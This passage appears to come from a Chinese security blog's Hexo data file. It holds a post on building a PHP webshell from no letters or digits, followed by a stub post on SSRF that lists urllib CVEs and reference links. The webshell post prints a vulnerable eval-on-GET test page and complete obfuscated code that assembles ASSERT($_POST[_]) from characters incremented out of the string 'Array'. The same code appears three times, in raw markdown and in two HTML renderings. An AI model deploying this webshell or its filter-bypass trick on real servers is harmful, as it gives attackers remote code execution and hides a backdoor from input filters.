A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\t\t\t\n```\n\n> 参考\n>\n> https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\n","slug":"php黑魔法","published":1,"updated":"2021-07-27T03:36:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuye9001lt8op4mqt87uh","content":"<h2 id=\"当数组遇上string\"><a href=\"#当数组遇上string\" class=\"headerlink\" title=\"当数组遇上string\"></a>当数组遇上string</h2><p>由php手册我们知道</p>\n<p>Array转换整型int/浮点型float会返回元素个数；</p>\n<p>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p>\n<p>那么实际应用是怎样的呢？</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token shell-comment comment\">#test.php</span>\n<span class=\"token delimiter\">&lt;?php</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[a-z0-9]/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n          <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>要解决这个问题，就得构造无字母和数字的webshell</p>\n<p>这里需要借助PHP中的另一个小技巧</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png\" alt=\"image-20210524032255299\"></p>\n<p>即<code>'a'++='b'</code>,<code>'b'++='c'</code>…因此，我们只需要拿到一个字符<code>a</code>，通过自增操作即可获取a-Z中所有字符</p>\n<p>那么如何拿到字符<code>a</code>呢？</p>\n<p>巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A</p>\n<p>而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串<code>Array</code><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png\" alt=\"image-20210524032857554\"></p>\n<p>那么可构造如下webshell</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token comment\" spellcheck=\"true\">//最终构造Payload：ASSERT($_POST[_])</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>@<span class=\"token string\">\"$_\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_='Array';</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span><span class=\"token string\">'!'</span><span class=\"token operator\">==</span><span class=\"token string\">'@'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// $_=$_[0];</span>\n<span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// A</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// E </span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// R</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string\">'_'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// P</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// O</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// S</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$__</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// T</span>\n<span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span>$<span class=\"token variable\">$____</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">[</span>_<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// ASSERT($_POST[_]);            </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n</blockquote>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h2 id=\"当数组遇上string\"><a href=\"#当数组遇上string\" class=\"headerlink\" title=\"当数组遇上string\"></a>当数组遇上string</h2><p>由php手册我们知道</p>\n<p>Array转换整型int/浮点型float会返回元素个数；</p>\n<p>转换bool返回Array中是否有元素；转换成string返回’Array’，并抛出warning。</p>\n<p>那么实际应用是怎样的呢？</p>\n<pre><code class=\"php\">#test.php\n&lt;?php\n    if(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {\n          eval($_GET[&#39;shell&#39;]);\n    }\n?&gt;</code></pre>\n<p>要解决这个问题，就得构造无字母和数字的webshell</p>\n<p>这里需要借助PHP中的另一个小技巧</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032255299.png\" alt=\"image-20210524032255299\"></p>\n<p>即<code>&#39;a&#39;++=&#39;b&#39;</code>,<code>&#39;b&#39;++=&#39;c&#39;</code>…因此，我们只需要拿到一个字符<code>a</code>，通过自增操作即可获取a-Z中所有字符</p>\n<p>那么如何拿到字符<code>a</code>呢？</p>\n<p>巧了，数组(Array)的第一个字母就是大写A，而第4个字母就是小写a，即我们能同时拿到小写a和大写A</p>\n<p>而在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串<code>Array</code><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210524032857554.png\" alt=\"image-20210524032857554\"></p>\n<p>那么可构造如下webshell</p>\n<pre><code class=\"php\">&lt;?php\n//最终构造Payload：ASSERT($_POST[_])\n$_=[];\n$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;\n$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&#39;_&#39;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);            </code></pre>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n</blockquote>\n"},{"title":"SSRF应用场景","date":"2021-09-10T06:01:11.909Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n## SSRF在Python中的利用\n\n- urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through  3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大\n- 除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python  2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。\n\n## SSRF在JAVA中的利用\n\n## 30x跳转\n\n## URL解析绕过\n\n## DNS rebinding\n\n> 参考\n>\n> https://security.tencent.com/index.php/blog/msg/179\n\nhttps://websec.readthedocs.io/zh/latest/vuln/ssrf.html\n\nhttps://websec.readthedocs.io/zh/latest/vuln/index.html\n\nhttps://www.evi1s.com/archives/140/\n\nhttps://www.anquanke.com/post/id/226240\n\nhttp://www.feidao.site/wordpress/?p=2116\n\n","source":"_posts/SSRF应用场景.md","raw":"---\ntitle: SSRF应用场景\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: SSRF\ncategories: SSRF\n---\n\n\n\n## SSRF在Python中的利用\n\n- urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through  3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大\n- 除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python  2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。\n\n## SSRF在JAVA中的利用\n\n## 30x跳转\n\n## URL解析绕过\n\n## DNS rebinding\n\n> 参考\n>\n> https://security.tencent.com/index.php/blog/msg/179\n\nhttps://websec.readthedocs.io/zh/latest/vuln/ssrf.html\n\nhttps://websec.readthedocs.io/zh/latest/vuln/index.html\n\nhttps://www.evi1s.com/archives/140/\n\nhttps://www.anquanke.com/post/id/226240\n\nhttp://www.feidao.site/wordpress/?p=2116\n\n","slug":"SSRF应用场景","published":1,"updated":"2021-07-27T03:31:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuyea001ot8op315z4zls","content":"<h2 id=\"SSRF在Python中的利用\"><a href=\"#SSRF在Python中的利用\" class=\"headerlink\" title=\"SSRF在Python中的利用\"></a>SSRF在Python中的利用</h2><ul>\n<li>urllib曾爆出CVE-2019-9740、CVE-2019-9947两个漏洞，这两个漏洞都是urllib(urllib2)的CRLF漏洞，只是触发点不一样，其影响范围都在urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through  3.7.3之间，目前大部分服务器的python2版本都在2.7.10以下，python3都在3.6.x，这两个CRLF漏洞的影响力就非常可观了。其实之前还有一个CVE-2016-5699，同样的urllib（urllib2）的CRLF问题，但是由于时间比较早，影响范围没有这两个大</li>\n<li>除开CRLF之外，urllib还有一个鲜有人知的漏洞CVE-2019-9948，该漏洞只影响urllib，范围在Python  2.x到2.7.16，这个版本间的urllib支持local_file/local-file协议，可以读取任意文件，如果file协议被禁止后，不妨试试这个协议来读取文件。</li>\n</ul>\n<h2 id=\"SSRF在JAVA中的利用\"><a href=\"#SSRF在JAVA中的利用\" class=\"headerlink\" title=\"SSRF在JAVA中的利用\"></a>SSRF在JAVA中的利用</h2><h2 id=\"30x跳转\"><a href=\"#30x跳转\" class=\"headerlink\" title=\"30x跳转\"></a>30x跳转</h2><h2 id=\"URL解析绕过\"><a href=\"#URL解析绕过\" class=\"headerlink\" title=\"URL解析绕过\"></a>URL解析绕过</h2><h2 id=\"DNS-rebinding\"><a href=\"#DNS-rebinding\" class=\"headerlink\" title=\"DNS rebinding\"></a>DNS rebinding</h2><blockquote>\n<p>参考</p>\n<p><a href=\"https://security.tencent.com/index.php/blog/msg/179\" target=\"_blank\" rel=\"noopener\">https://security.tencent.com/index.php/blog/msg/179</a></p>\n</blockquote>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/ssrf.html\" target=\"_blank\" rel=\"noopener\">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/index.html\" target=\"_blank\" rel=\"noopener\">https://websec.readthedocs.io/zh/latest/vuln/index.html</a></p>\n<p><a href=\"https://www.evi1s.com/archives/140/\" target=\"_blank\" rel=\"noopener\">https://www.evi1s.com/archives/140/</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/226240\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/226240</a></p>\n<p><a href=\"http://www.feidao.site/wordpress/?p=2116\" target=\"_blank\" 